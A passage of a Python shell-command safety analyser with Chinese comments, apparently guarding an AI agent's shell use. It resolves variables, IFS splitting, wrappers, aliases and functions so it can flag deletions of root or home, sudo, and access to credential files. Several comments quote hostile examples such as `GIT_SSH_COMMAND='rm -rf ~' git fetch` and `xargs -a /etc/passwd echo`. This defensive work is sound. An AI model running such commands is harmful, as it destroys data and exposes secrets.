            stack.append("$(")
            out.append("$(")
            i += 2
            continue
        elif c == "(":
            stack.append("(")
        elif c == ")" and top in ("$(", "("):
            stack.pop()
        elif c == "#" and (i == 0 or cmd[i - 1] in " \t\n;&|()<>"):
            while i < n and cmd[i] != "\n":   # 注释：去到行尾，换行留给下面当分隔符
                i += 1
            continue
        elif cmd.startswith("<<", i) and not cmd.startswith("<<<", i):
            j, strip_tabs = i + 2, cmd.startswith("<<-", i)
            j += strip_tabs
            while j < n and cmd[j] in " \t":
                j += 1
            start = j
            delim, j = _heredoc_word(cmd, j)
            if delim:
                heredocs.append((delim, strip_tabs, any(q in cmd[start:j] for q in "'\"\\")))
            out.append(cmd[i:j])
            i = j
            continue
        elif c == "\n":
            out.append(" ; ")
            i += 1
            for delim, strip_tabs, quoted in heredocs:
                end = _heredoc_end(cmd, i, delim, strip_tabs, quoted)
                if end is None:                   # 没有结束符：正文按命令分析
                    break
                if bodies is not None:
                    bodies.setdefault(delim, []).append(cmd[i:end[0]])
                i = end[1]
            heredocs.clear()
            continue
        out.append(c)
        i += 1
    return "".join(out)


_ANSI_SIMPLE = {"a": "\a", "b": "\b", "e": "\x1b", "E": "\x1b", "f": "\f", "n": "\n", "r": "\r", "t": "\t", "v": "\v",
                "\\": "\\", "'": "'", '"': '"', "?": "?"}
_ANSI_ESC = re.compile(r"\\(?:([abeEfnrtv\\'\"?])|([0-7]{1,3})|x\{([0-9a-fA-F]*)\}?|x([0-9a-fA-F]{1,2})|u([0-9a-fA-F]{1,4})"
                       r"|U([0-9a-fA-F]{1,8})|c(.))", re.S)


def _ansi_c(body: str) -> str:
    """按 bash 的规则解码 ``$'...'`` 的正文（\\n、\\xHH、\\x{HH}、\\uHHHH、八进制、\\e、\\cX……）。
    不认识的转义（\\<、\\.）和 bash 一样保留反斜杠——不借用 Python 的 unicode_escape，它对未知转义的处理会随版本变成报错。
    bash 的字符串到 NUL 为止：``$'rm\\x00junk'`` 就是 ``rm``"""
    def one(m: re.Match) -> str:
        simple, octal, braced, hx, u4, u8, ctl = m.groups()
        if simple:
            return _ANSI_SIMPLE[simple]
        if octal:
            return chr(int(octal, 8) & 0xFF)
        if braced is not None:     # bash 的 \\x{...}：位数不限，取低 8 位，} 可以省略，没有数字就是 NUL
            return chr(int(braced or "0", 16) & 0xFF)
        if hx:
            return chr(int(hx, 16))
        if u4 or u8:
            cp = int(u4 or u8, 16)
            return m.group(0) if cp > 0x10FFFF or 0xD800 <= cp <= 0xDFFF else chr(cp)
        return chr(ord(ctl) & 0x1F)
    return _ANSI_ESC.sub(one, body).split("\0", 1)[0]


def _heredoc_word(cmd: str, j: int) -> tuple[str, int]:
    """读出 ``<<`` 后面的结束符（去掉引号与反斜杠，bash 按去引号后的字面量比较），返回 (结束符, 读到的位置)。"""
    word, quote = [], ""
    while j < len(cmd):
        c = cmd[j]
        if quote:
            if c == quote:
                quote = ""
            else:
                word.append(c)
        elif c in "'\"":
            quote = c
        elif c == "\\" and j + 1 < len(cmd):
            j += 1
            word.append(cmd[j])
        elif c in " \t\n;&|()<>":
            break
        else:
            word.append(c)
        j += 1
    return "".join(word), j


def _heredoc_end(cmd: str, start: int, delim: str, strip_tabs: bool, quoted: bool = True) -> tuple[int, int] | None:
    """从 start 起逐行找结束符所在的行，返回 (这一行的开头, 它之后的位置)；找不到返回 None。
    结束符不带引号时 bash 读每一行都先去掉 ``\\``+换行，再比较：``EO\\⏎F`` 就是 ``EOF``，后面的行是真命令。"""
    pos = start
    while pos <= len(cmd):
        head, line = pos, ""
        while True:
            nl = cmd.find("\n", pos)
            part = cmd[pos:] if nl == -1 else cmd[pos:nl]
            pos = len(cmd) + 1 if nl == -1 else nl + 1
            if quoted or nl == -1 or (len(part) - len(part.rstrip("\\"))) % 2 == 0:
                line += part
                break
            line += part[:-1]
        if (line.lstrip("\t") if strip_tabs else line) == delim:
            return head, min(pos, len(cmd))
    return None


def _unwrap(words: list[str], a: CommandAnalysis) -> list[str]:
    """剥掉前置赋值、复合命令的保留字与包装命令，返回真正执行的那条命令（可能为空：例如单独的 ``env``、``fi``）。
    段首的赋值后面没有命令时，就是在当前 shell 里赋值：记下取值，后面的段按值展开。"""
    lead: list[str] | None = []
    while words:
        while words and (_ASSIGN.fullmatch(words[0]) or words[0] in RESERVED or words[0] == "function"):
            if _ASSIGN.fullmatch(words[0]):
                _check_assign(words[0], a)
                if lead is not None:
                    lead.append(words[0])
            words = words[2:] if words[0] == "function" else words[1:]  # FOO=bar cmd、then cmd、function f { cmd
        if not words:
            for w in lead or ():
                _assign(w, a)
            return []
        for w in lead or ():   # FOO=bar cmd：只在这条命令的环境里，sh -c 之类的子进程看得到
            _prefix(w, a)
        lead = None
        name = words[0].rsplit("/", 1)[-1]
        if name not in WRAPPERS:
            return words
        rest, takes = words[1:], WRAPPERS[name]
        if name in ("sudo", "doas"):
            a.bump("dangerous", f"{name} 提权执行")
        if name == "xargs":   # find . | xargs cat、cat list.txt | xargs cat：读写的路径是数据，命令串里看不到
            a.bump("external", "xargs 从标准输入取参数，实际读写的路径无法静态判断")
        while rest and (rest[0].startswith("-") or (name == "env" and _ASSIGN.fullmatch(rest[0]))):
            opt = rest.pop(0)
            if _ASSIGN.fullmatch(opt):   # env PATH=. ls
                _check_assign(opt, a)
                _prefix(opt, a)
                continue
            opt, *more = _split_cluster(opt, takes)   # env -vS 'x'、env -C/、sudo -iu root
            rest[:0] = more
            key = opt.split("=", 1)[0]
            if len(key) > 2 and key.startswith("--"):   # 长选项可以缩写
                key = next((o for o in sorted(takes) if o.startswith(key)), key)
            if opt.startswith("--") and "=" in opt:
                val = opt.split("=", 1)[1]
            else:
                val = rest.pop(0) if key in takes and rest else ""
            if name == "env" and key in ("-S", "--split-string"):   # 切开之后接着解包：env -S 'rm -rf ~' 执行的就是 rm -rf ~
                a.bump("external", "env -S 会把字符串再切分执行，无法静态分析")
                a.inline = True
                rest[:0] = _split_string(val)
                continue
            if val and _is_outside(val, a):   # env -C /etc cat passwd、xargs -a /etc/passwd echo：选项值同样是路径
                a.bump("external", f"{name} {key} 访问工作区外路径 {val}")
            if val and name == "env" and key in ("-C", "--chdir"):   # 之后的命令在那里执行（git 读那里的仓库配置）
                _chdir_to(val, a)
        if name == "command" and rest[:1] in (["-v"], ["-V"]) or words[1:2] in (["-v"], ["-V"]) and name == "command":
            return ["type"]  # command -v：只是查找命令位置
        if name == "timeout" and rest and _DURATION.fullmatch(rest[0]):
            rest = rest[1:]
        if not rest:
            return [name] if name == "env" else []  # 单独的 env：打印环境变量
        words = rest
    return words


def _split_cluster(x: str, takes: set[str]) -> list[str]:
    """短选项簇按 getopt 的规则拆开：带值的字母之后都是它的值（``-vS`` → ``-v -S``，``-Cdir`` → ``-C dir``）。"""
    if x.startswith("--") or len(x) < 3:
        return [x]
    out: list[str] = []
    for j, c in enumerate(x[1:], start=1):
        out.append(f"-{c}")
        if f"-{c}" in takes:
            out += [x[j + 1:]] if x[j + 1:] else []
            break
    return out


def _split_string(s: str) -> list[str]:
    try:
        return shlex.split(s)
    except ValueError:      # 引号不配对：按空白切，宁可多看几个词
        return s.split()


# 值本身就是一条命令的环境变量：GIT_SSH_COMMAND='rm -rf ~' git fetch 执行的就是 rm -rf ~
_CMD_ENV = re.compile(r"GIT_(SSH_COMMAND|EXTERNAL_DIFF|PAGER|EDITOR|SEQUENCE_EDITOR|ASKPASS)|SSH_ASKPASS|PAGER|MANPAGER"
                      r"|EDITOR|VISUAL|LESSOPEN|LESSCLOSE")


def _check_assign(word: str, a: CommandAnalysis) -> None:
    """``NAME=值``（前置赋值、独立赋值、``env NAME=值``、``export NAME=值``）：只有 BENIGN_ENV 里的变量不改变“实际执行什么”。"""
    name, _, value = word.partition("=")
    name = name.rstrip("+")
    if BENIGN_ENV.fullmatch(name):
        return
    a.bump("external", f"设置环境变量 {name}，可能改变命令实际执行的程序或读取的配置（PATH、HOME、LD_PRELOAD、GIT_* 等）")
    if _CMD_ENV.fullmatch(name) and value.strip("|"):
        _recurse(value.lstrip("|"), a, f"环境变量 {name}")


# ---------------------------------------------------------------------- 变量与当前目录
def _assign(word: str, a: CommandAnalysis, *, nameref: bool = False) -> None:
    """当前 shell 里的赋值 ``NAME=值``（值已经按之前的赋值展开过）。值含命令替换时要到运行时才知道，记成 None；
    ``X+=y`` 接在原来的取值后面，变量可能没赋过时 ``+=`` 就是 ``=``（``A+=/usr; rm -rf $A``），也可能是继承来的未知值；
    ``declare -n`` 的名字引用指向别的变量，同样记成 None。"""
    name, _, value = word.partition("=")
    dynamic = nameref or "$(" in value or "`" in value or value.endswith("$")   # X=$(cmd) 被切成 X=$ 与 (cmd)
    if name.endswith("+"):
        name = name[:-1]
        old = a.vars.get(name)
        if dynamic:
            values = [None]
        elif old and None not in old and name in a.sure:
            values = [o + value for o in old]
        else:
            values = [*(o + value for o in old or () if o is not None), value, None]
    else:
        values = [None if dynamic else value]
    _add_values(name, values, a)
    a.assigned.add(name)


def _prefix(word: str, a: CommandAnalysis) -> None:
    """记下前置赋值 ``FOO=bar cmd`` 的值（含命令替换时不知道），见 _apply_prefix。``FOO+=bar cmd`` 接在原来的值后面，
    变量可能没赋过时就是普通赋值（``D+=/ sh -c 'rm -rf ${D}usr'``）。"""
    name, _, value = word.partition("=")
    known: str | None = None if "$(" in value or "`" in value or value.endswith("$") else value
    if name.endswith("+"):
        name = name[:-1]
        old = a.vars.get(name) or []
        if known is not None and len(old) == 1 and old[0] is not None and name in a.sure:
            known = old[0] + known
    a.prefix[name] = known


def _scope_for(a: CommandAnalysis, mode: str) -> tuple:
    """递归分析时带进去的作用域：child（新进程）里没导出的变量可能是空的；same（eval、调用别名与函数）里定义的
    别名与函数留到后面。"""
    sure = a.sure & a.exported if mode == "child" else a.sure
    return a.vars, sure, a.exported, a.cwds, a.cache, a.budget, \
        a.defs if mode == "same" else {k: list(v) for k, v in a.defs.items()}


_LIT_REF = re.compile(_LIT + r"(?:\{([A-Za-z_]\w*)\}|([A-Za-z_]\w*))")


def _apply_prefix(script: str, a: CommandAnalysis) -> str:
    """前置赋值（``FOO=bar sh -c '...$FOO...'``）只有这条命令和它的子进程看得到：把单引号里留给子 shell 展开的
    ``$FOO`` 换成它的值。外层已经展开过的 ``$FOO``（写在双引号里）用的是外层的值，不换——
    ``DIR=build bash -c "rm -rf $DIR/*"`` 删的是 ``/*``。"""
    if not a.prefix:
        return script

    def one(m: re.Match) -> str:
        v = a.prefix.get(m.group(1) or m.group(2))
        return m.group(0) if v is None else v
    return _LIT_REF.sub(one, script)


def _add_values(name: str, values, a: CommandAnalysis) -> None:
    cur = a.vars.setdefault(name, [])
    for v in values:
        if v not in cur:
            cur.append(v if len(cur) < _VALUE_LIMIT else None)


def _set_unknown(name: str, a: CommandAnalysis) -> None:
    if re.fullmatch(r"[A-Za-z_]\w*", name):
        _add_values(name, [None], a)
        a.assigned.add(name)


def _var_values(name: str, keep: str, a: CommandAnalysis) -> list[str]:
    """变量可能的取值。没赋过、不一定赋过或者值未知时，保留原来的写法（keep），之后按位置未知处理。"""
    if name == "PWD":   # 没有 cd 过时就是工作区根目录
        return ["."] if a.cwds == [""] else [keep]
    vals = a.vars.get(name)
    if not vals:
        return [keep]
    out = [v for v in vals if v is not None]
    if None in vals or name not in a.sure:
        out.append(keep)
    return list(dict.fromkeys(out))


def _may_be_empty(name: str, a: CommandAnalysis) -> bool:
    if name in _NEVER_EMPTY:
        return False
    return name not in a.sure or any(v in ("", None) for v in a.vars.get(name, [None]))


def _ref_values(m: re.Match, a: CommandAnalysis) -> list[str]:
    """一处变量引用可能展开成的值。``${X:-默认值}`` 算上默认值，``${X:+替换}`` 算上空串；
    ``${X#…}``、``${X/…}``、``${!X}`` 这类裁剪替换保留原样（值未知）。"""
    body, name = m.group(1), m.group(2)
    if body is None:
        return _var_values(name, m.group(0), a)
    if body.startswith("#") and len(body) > 1:   # ${#X}：长度
        return ["0"]
    p = _PARAM.fullmatch(body)
    if not p:
        return [m.group(0)]
    name, op, word = p.groups()
    if op is None:
        return _var_values(name, m.group(0), a)
    if op in (":+", "+"):
        return [word, ""] if _may_be_empty(name, a) else [word]
    keep = "${%s:?}" % name   # 非空、但不知道是什么
    vals = [v for v in _var_values(name, keep, a) if v or op in ("-", "=", "?")]   # 带冒号的写法：空值同样换成默认值 / 报错
    if op in (":-", "-", ":=", "=") and _may_be_empty(name, a):
        vals.append(word)
    return list(dict.fromkeys(vals)) or [keep]


def _word_values(w: str, a: CommandAnalysis) -> list[str]:
    if "$" not in w:
        return [w]
    parts: list[list[str]] = []
    pos = 0
    for m in _VAR_REF.finditer(w):
        parts += [[w[pos:m.start()]], _ref_values(m, a)]
        pos = m.end()
    parts.append([w[pos:]])
    out = list(dict.fromkeys("".join(c) for c in itertools.islice(itertools.product(*parts), _VARIANT_LIMIT + 1)))
    if len(out) > _VARIANT_LIMIT:
        # 只往下传前 _VARIANT_LIMIT 种：截掉的取值同样要看，有根目录、家目录这类取值，或者多到查不过来，都拒绝
        total = math.prod(len(p) for p in parts)
        risky = None if total > _WORK_LIMIT else next(
            (v for c in itertools.product(*parts) if _risky_value(v := "".join(c), a)), None)
        if total > _WORK_LIMIT or risky:
            a.flag_catastrophic(f"{w} 里变量取值的组合太多（{total} 种）" + (f"，其中有 {risky} 这样的取值" if risky else "") +
                                "，无法逐个确认它不是根目录、家目录、块设备或凭证位置；请拆成几条命令")
        else:
            a.bump("external", f"{w} 里变量取值的组合太多，无法逐个分析")
    return out[:_VARIANT_LIMIT]


def _substitute(words: list[str], a: CommandAnalysis, drift: str | None = None) -> list[list[str]]:
    """把赋过值的变量换成每种可能的取值，每种组合一份（最多 _VARIANT_LIMIT 份）。取值里有空白、原词里没有时，
    带引号（整体一个词）与不带引号（按空白拆开）各算一份：``bash -c "$C"`` 与 ``rm $ARGS`` 都要看到；
    取值为空时同理（带引号是一个空参数，不带引号整个词消失）。drift 是 source 过的脚本可能改成的 IFS（见 _drift_seps）。"""
    if not any("$" in w for w in words):
        return [words]
    ifs = a.vars.get("IFS") or []
    if None in ifs:
        a.flag_catastrophic("IFS 被赋了运行时才知道的值，变量展开后怎么拆成词无法静态判断；不要这样改 IFS")
    # IFS=/ 时 /bin/rm 拆成 bin rm
    chars = drift if drift is not None else "".join({c for v in ifs if v and v != _DRIFT for c in v})
    sep = re.compile(r"[\s%s]+" % re.escape(chars))
    choices: list[list[tuple[str, ...]]] = []
    for w in words:
        opts: list[tuple[str, ...]] = []
        for v in _word_values(w, a):
            opts.append((v,))
            if v != w and not any(c.isspace() for c in w) and (not v or sep.search(v)):
                opts.append(tuple(_split_value(v, sep)))
        choices.append(list(dict.fromkeys(opts)))
    total = math.prod(len(c) for c in choices)
    if total > _VARIANT_LIMIT:
        # 只分析前 _VARIANT_LIMIT 种：截掉的组合里若有危险的取值，宁可拒绝，也不能当作没看见
        risky = next((x for w, c in zip(words, choices) if "$" in w for opt in c for v in opt for x in v.split()
                      if _risky_value(x, a)), None)
        if risky:
            a.flag_catastrophic(f"变量取值的组合太多（{total} 种），其中有 {risky} 这样的取值（根目录、家目录、块设备或凭证位置），"
                                "无法逐个确认；请拆成几条命令")
        else:
            a.bump("external", f"变量取值的组合太多（{total} 种），无法逐个分析")
    return [[x for part in combo for x in part] for combo in itertools.islice(itertools.product(*choices), _VARIANT_LIMIT)]


def _split_value(v: str, sep: re.Pattern) -> list[str]:
    """按 IFS 拆开一个取值。取值里家目录的写法（~/x）在赋值时已经展开成真实路径：分隔符落在家目录路径里时
    （IFS=/），先换成真实路径再拆，拆出来的是 Users、me 这样的相对词，不是 ~。"""
    m = re.match(r"(~[^/]*|\$HOME|\$\{HOME\})(?=/|$)", v)
    if m:
        home = os.path.expanduser(m.group(0)) if m.group(0).startswith("~") else _real_home()
        if sep.search(home):
            v = home + v[m.end():]
    return [x for x in sep.split(v) if x]


def _risky_value(v: str, a: CommandAnalysis) -> bool:
    """变量取值本身（或者其中的变量为空时）是根目录、家目录及其下一级、块设备或凭证位置。相对路径按可能的当前目录
    拼起来判断（cd /tmp 之后的 ../*）；当前目录不知道在哪时，.. 开头的相对路径哪里都能到。"""
    if _BLOCK_DEV.match(v) or CREDENTIAL_HINTS.search(v) or _root_hit(v, a, 1):
        return True
    return None in a.cwds and v.startswith("..")


def _drift_tokens(v: str) -> list[tuple[str, str, str]]:
    """IFS 被改过时，v 拆成词后可能出现的根目录、家目录或它们下一级，连同它前后的分隔符：a:/ 在 IFS 含 : 时拆出 /，
    x,/usr;y 在 IFS 含 , 与 ; 时拆出 /usr。前后的分隔符就是 IFS 里的字符，它们不能出现在这个词里面。"""
    w = _to_abs(v)[:128]
    out = []

    def sep(c: str, t: str) -> bool:
        return not (c.isalnum() or c in "_\0" or c in t)   # \0 是家目录占位，代表家目录路径里的字符
    for i, c in enumerate(w):
        if c != "/" or (i and not sep(w[i - 1], "/")):
            continue
        for j in range(i + 1, len(w) + 1):
            t = w[i:j]
            if (i and not sep(w[i - 1], t)) or (j < len(w) and not sep(w[j], t)):
                continue
            if (d := _root_depth(t)) is not None and d <= 1 and "\0" not in (t := _from_abs(t)):
                out.append((t, w[i - 1] if i else "", w[j] if j < len(w) else ""))
    return out


def _drift_seps(words: list[str], a: CommandAnalysis) -> list[str]:
    """source 执行的脚本可能把 IFS 改成了别的字符（见 _forget），变量展开后的拆法无法一一列举。按取值里出现的标点
    挑几种最要紧的 IFS：能拆出根目录、家目录的那一对分隔符；全部标点；除 - 以外的全部标点（-rf 这类选项不被拆开）；
    每个标点单独一种（C=rm.-rf./ 在 IFS=. 时执行的是 rm -rf /）。字母、数字当 IFS 只出现在刻意混淆的命令里，交给沙箱。"""
    vals = [v for w in words if "$" in w for v in _word_values(w, a) if v != w]
    chars = sorted({c for v in vals for c in v if not (c.isalnum() or c.isspace() or c in (_LIT, _DRIFT))})
    if not chars:
        return []
    seps = [l + r for v in vals for _, l, r in _drift_tokens(v)]
    seps += ["".join(chars), "".join(c for c in chars if c != "-"), *chars]
    seps = list(dict.fromkeys(x for x in seps if x))
    if len(seps) > 12:
        a.bump("external", "source 执行的脚本可能改了 IFS，变量取值里的标点太多，无法逐一试拆")
    return seps[:12]


def _opaque(word: str, a: CommandAnalysis) -> bool:
    """词里有值要到运行时才知道的变量（``$(...)``、``read`` 赋的值，或 ``${X#…}`` 这类裁剪替换）：落在哪里无从判断。"""
    for m in _VAR_REF.finditer(word):
        body, name = m.group(1), m.group(2)
        if body is not None:
            p = _PARAM.fullmatch(body)
            if not p or p.group(2) not in (None, ":?", "?"):
                return True
            name = p.group(1)
        if None in a.vars.get(name, ()):
            return True
    return False


def _has_ref(word: str) -> bool:
    return any(m.group(2) not in _SAFE_SPECIAL for m in _VAR_REF.finditer(word))


def _empty_variant(word: str) -> tuple[str, list[str]]:
    """可能为空的变量都换成空串之后的样子，以及换掉的变量。``${X:?}``、``$HOME``、``$?`` 这类不会为空。"""
    names: list[str] = []

    def one(m: re.Match) -> str:
        body, name = m.group(1), m.group(2)
        p = _PARAM.fullmatch(body) if body is not None else None
        n = name or (p.group(1) if p else None)
        if n in _NEVER_EMPTY or (p and p.group(2) in (":?", "?")) or (body or "").startswith("#"):
            return m.group(0)
        names.append(n or m.group(0))
        return ""
    return _VAR_REF.sub(one, word), list(dict.fromkeys(names))


def _real_home() -> str:
    """当前账户的家目录。取账户数据库里的，不取 HOME 环境变量：测试、hook 会改 HOME，账户的真实家目录不变。"""
    try:
        import pwd

        return pwd.getpwuid(os.getuid()).pw_dir.rstrip("/") or "/"
    except (ImportError, KeyError):
        return os.path.expanduser("~").rstrip("/") or "/"


# 字面写出的家目录同样是家目录：rm -rf /Users/me 和 rm -rf ~ 是一回事，模型常从 pwd 的输出里抄来绝对路径
_HOME_FORMS = re.compile(r"^(~[^/]*|\$HOME|\$\{HOME\}|/Users/[^/]+|/home/[^/]+|/root|/var/root|%s)(?=/|$)"
                         % re.escape(_real_home()))


def _to_abs(p: str) -> str:
    """家目录的写法（~、~user、$HOME、${HOME}，以及 /Users/<名字>、/home/<名字>、/root 这类字面路径）换成根下的
    占位目录，好和绝对路径一起做路径运算。"""
    return _HOME_FORMS.sub(lambda m: _HOME_MARK, p)


def _from_abs(p: str) -> str:
    return "~" + p[len(_HOME_MARK):] if p == _HOME_MARK or p.startswith(_HOME_MARK + "/") else p


def _root_depth(t: str) -> int | None:
    """路径在根目录或家目录下第几层（/、~ 是 0，/usr、~/projects、/* 是 1）；相对路径返回 None。"""
    t = _to_abs(t)
    if not t.startswith("/"):
        return None
    parts = [p for p in posixpath.normpath(re.sub(r"/+", "/", t)).split("/") if p]
    return len(parts) - 1 if parts[:1] == [_HOME_MARK[1:]] else len(parts)


def _join_cwd(cwd: str | None, target: str) -> str | None:
    """在 cwd 里 cd target 之后到了哪里：工作区内用相对路径表示（"" 是根目录），工作区外用绝对路径或 ~ 开头。"""
    t = _to_abs(target)
    if t.startswith("/"):
        return _from_abs(posixpath.normpath(re.sub(r"/+", "/", t)))
    if cwd is None:
        return None
    base = _to_abs(cwd)
    if base.startswith("/"):
        return _from_abs(posixpath.normpath(posixpath.join(base, t)))
    rel = posixpath.normpath(posixpath.join(cwd, t))
    return "" if rel == "." else rel


def _add_cwd(c: str | None, a: CommandAnalysis) -> None:
    if c not in a.cwds:
        a.cwds.append(c if len(a.cwds) < _CWD_LIMIT else None)


def _chdir_to(target: str, a: CommandAnalysis) -> None:
    """记下切换到 target 之后可能的当前目录。只增不减：分支、子 shell 里的切换也算上，宁可多判几处。
    target 取决于值未知的变量时位置未知；变量为空时，不带引号的 ``cd $D`` 回到家目录、``cd $D/x`` 到了 /x。"""
    target = _from_abs(_to_abs(target))   # $HOME/x 就是 ~/x
    if _has_ref(target):
        a.bump("external", f"切换到的目录 {target} 取决于变量，之后的相对路径落在哪里无法静态判断")
        _add_cwd(None, a)
        ev, names = _empty_variant(target)
        if names:
            for c in list(a.cwds):
                _add_cwd(_join_cwd(c, ev) if ev else "~", a)
        return
    for c in list(a.cwds):
        _add_cwd(_join_cwd(c, target), a)


def _chdir(cmd: str, args: list[str], a: CommandAnalysis) -> None:
    """cd / pushd / popd。``cd -``、``popd`` 回到之前的目录：命令里切换过的都已经算上了，没切换过时是命令开始前的
    目录（OLDPWD），位置未知。"""
    targets = [x for x in args if x == "-" or not x.startswith(("-", "+"))]
    if cmd == "popd" or targets[:1] == ["-"] or (cmd == "pushd" and (not targets or len(targets) < len(args))):
        if len(a.cwds) == 1 and (cmd == "cd" or targets):
            _add_cwd(None, a)
        return
    _chdir_to(targets[0] if targets else "~", a)


def _loop_header(args: list[str], a: CommandAnalysis) -> None:
    """``for NAME in 词…``：循环变量依次取这些词（已经展开过）。没有 in 时取位置参数，值未知。
    它是否一定赋过值由 _Flow 管：只在循环体里算。"""
    if not args or not re.fullmatch(r"[A-Za-z_]\w*", args[0]):
        return
    if args[1:2] == ["in"]:
        _add_values(args[0], [None if "$(" in v or "`" in v or v.endswith("$") else v for v in args[2:]], a)
    else:
        _add_values(args[0], [None], a)


_VAR_SETTERS = {"read", "mapfile", "readarray", "getopts", "unset", "wait"}
# 各命令带值的短选项字母；值是变量名的另外列出（read -a 数组、printf -v、wait -p）
_SETTER_OPTS = {"read": ("adinNptu", "a"), "mapfile": ("dnOsuCc", ""), "readarray": ("dnOsuCc", ""), "wait": ("p", "p"),
                "printf": ("v", "v")}


def _short_split(args: list[str], takes: str) -> tuple[list[tuple[str, str | None]], list[str]]:
    """短选项簇按 getopt 的规则拆开（``-raNAME``、``-vNAME``、``-u 3``）：返回 ([(字母, 值)], 位置参数)。"""
    opts: list[tuple[str, str | None]] = []
    pos: list[str] = []
    i = 0
    while i < len(args):
        x = args[i]
        if x == "--":
            pos += args[i + 1:]
            break
        if not x.startswith("-") or x == "-":
            pos.append(x)
            i += 1
            continue
        for j, c in enumerate(x[1:], start=1):
            if c in takes:
                val = x[j + 1:]
                if not val and i + 1 < len(args):
                    i += 1
                    val = args[i]
                opts.append((c, val))
                break
            opts.append((c, None))
        i += 1
    return opts, pos


def _var_setters(cmd: str, args: list[str], a: CommandAnalysis) -> None:
    """给变量赋运行时才知道的值（read、mapfile、getopts、printf -v、wait -p），或者清空它（unset）。"""
    if cmd == "unset":
        for x in args:
            if re.fullmatch(r"[A-Za-z_]\w*", x):
                _add_values(x, [""], a)
                a.assigned.add(x)
        return
    if cmd == "getopts":
        for x in args[1:2]:
            _set_unknown(x, a)
        return
    takes, named = _SETTER_OPTS[cmd]
    opts, pos = _short_split(args, takes)
    for c, v in opts:
        if cmd in ("mapfile", "readarray") and c == "C":
            a.bump("external", f"{cmd} -C 会执行回调命令，无法静态分析")
            a.inline = True
            if v:
                _recurse(v, a, f"{cmd} -C")
    names = [v for c, v in opts if c in named and v]
    if cmd in ("read", "mapfile", "readarray"):
        names += pos[:None if cmd == "read" else 1] or ([] if names else ["REPLY" if cmd == "read" else "MAPFILE"])
    for n in names:
        _set_unknown(n, a)


def _forget(a: CommandAnalysis) -> None:
    """source 的脚本改了什么看不到：赋过值的变量都可能变成任何值，当前目录也可能换了，IFS 也可能改了。
    IFS 不记成“值未知”（那样之后每个变量展开都得拒绝），按 _drift_seps 补几种拆法。"""
    for name in list(a.vars):
        _add_values(name, [_DRIFT if name == "IFS" else None], a)
    _add_values("IFS", [_DRIFT], a)
    _add_cwd(None, a)


# ---------------------------------------------------------------------- 别名与函数
_CALL_LIMIT = 8   # 别名、函数层层调用最多展开几层，再深就拒绝


def _function_defs(toks: list[str]) -> list[tuple[str, list[str] | None]]:
    """命令里的函数定义（``f() { ...; }``、``function f { ...; }``、``f() ( ... )``）。定义处照常逐段分析一遍
    （那时位置参数不知道是什么）；调用处（``f ~``）再代入这次的参数分析，见 _call。不管先后，调用处每个同名定义
    都算：分支、循环里先调用后定义都可能用上。只认 { } 与 ( ) 函数体，认不出的记成 None。"""
    out: list[tuple[str, list[str] | None]] = []
    for i, t in enumerate(toks):
        head = i == 0 or toks[i - 1] in SEPARATORS or toks[i - 1] in RESERVED   # 只认命令位置上的
        if t == "function" and head and i + 1 < len(toks):
            name, j = toks[i + 1], i + 2
            j += 2 if toks[j:j + 2] == ["(", ")"] else 0
        elif head and toks[i + 1:i + 3] == ["(", ")"]:
            name, j = t, i + 3
        else:
            continue
        if not re.fullmatch(r"[\w.:@%+,-]+", name) or name in RESERVED:
            continue
        pair = {"{": "}", "(": ")"}.get(toks[j] if j < len(toks) else "")
        body: list[str] | None = None
        if pair is not None:
            depth, k = 0, j
            while k < len(toks):
                depth += (toks[k] == toks[j]) - (toks[k] == pair)
                if depth == 0:
                    break
                k += 1
            body = toks[j + 1:k]
        out.append((name, body))
    return out


def _define(name: str, d: tuple, a: CommandAnalysis) -> None:
    defs = a.defs.setdefault(name, [])
    if d not in defs:
        defs.append(d)


def _call(name: str, args: list[str], a: CommandAnalysis) -> None:
    """调用命令里定义过的别名或函数：别名换成它的值再接上参数（``alias r='rm -rf'; r ~``），函数体代入这次的参数
    （``f() { rm -rf "$@"; }; f ~``），在当前 shell 里再分析一遍；同名的每个定义都分析。
    分析时先拿掉这个名字：bash 不会在别名的值里再展开同一个别名（``alias ls='ls -F'``），函数递归调用自己也不必再
    分析一遍。层层调用另外计数，不占 sh -c 那几层递归深度，超过 _CALL_LIMIT 层就拒绝——截断处可能正是 rm -rf。"""
    args = [w for k, w in enumerate(args) if not _OPERATOR.fullmatch(w) and not (k and _OPERATOR.fullmatch(args[k - 1]))]
    if a.budget[1] >= _CALL_LIMIT:
        a.flag_catastrophic(f"别名、函数层层调用超过 {_CALL_LIMIT} 层，无法逐层确认最终执行什么；请直接写出要执行的命令")
        return
    defs = a.defs.pop(name)
    a.budget[1] += 1
    try:
        for kind, body in defs:
            if kind == "alias":
                # 值里单引号中的 $ 在用到别名时照样展开，不是留给子 shell 的：先换回 $，免得被当作前置赋值代入
                _recurse(f"{body.replace(_LIT, '$')} {_requote(args)}", a, f"别名 {name}", mode="same", nest=False)
            elif body is None:
                a.bump("external", f"函数 {name} 的写法认不出，调用时执行什么无法静态分析")
            elif body:
                for view in _arg_views(body, args, a):
                    saved = _bind_positional(view, a)
                    try:
                        _recurse(_body_text(body), a, f"函数 {name}", mode="same", nest=False)
                    finally:
                        _restore_positional(saved, a)
    finally:
        a.budget[1] -= 1
        later = a.defs.pop(name, [])
        a.defs[name] = defs + [d for d in later if d not in defs]


def _moves_positional(body: list[str], a: CommandAnalysis) -> bool:
    """函数体可能挪动或重设位置参数：含 shift / set / getopts 字样的词（``eval "shift 2"``、``builtin shift``）、
    ``${@:n}`` 截取，或者命令位置上是 eval、source、变量（``$CMD`` 可能就是 shift）、别名。宁可多算几份。"""
    for i, t in enumerate(body):
        if re.search(r"shift|set|getopts|\$\{[@*]:", t):
            return True
        head = i == 0 or body[i - 1] in SEPARATORS or body[i - 1] in RESERVED
        if head and (t in ("eval", "source", ".") or "$" in t or
                     any(kind == "alias" for kind, _ in a.defs.get(t, ()))):
            return True
    return False


def _arg_views(body: list[str], args: list[str], a: CommandAnalysis) -> list[list[str]]:
    """这次调用里位置参数可能的样子。函数体可能挪动位置参数时（见 _moves_positional），$1 可能是后面任何一个参数：
    去掉前 0、1、2……个各算一份，``set -- 词…`` 写明的词另算一份。"""
    if not _moves_positional(body, a):
        return [args]
    views = [args[k:] for k in range(len(args) + 1)]
    for i, t in enumerate(body[:-1]):
        if t == "set" and body[i + 1] == "--":
            j = i + 2
            while j < len(body) and not _OPERATOR.fullmatch(body[j]) and body[j] not in RESERVED:
                j += 1
            views.append(body[i + 2:j])
    if len(views) > _VARIANT_LIMIT:
        risky = next((x for x in args + [w for v in views for w in v] if _risky_value(x, a)), None)
        if risky:
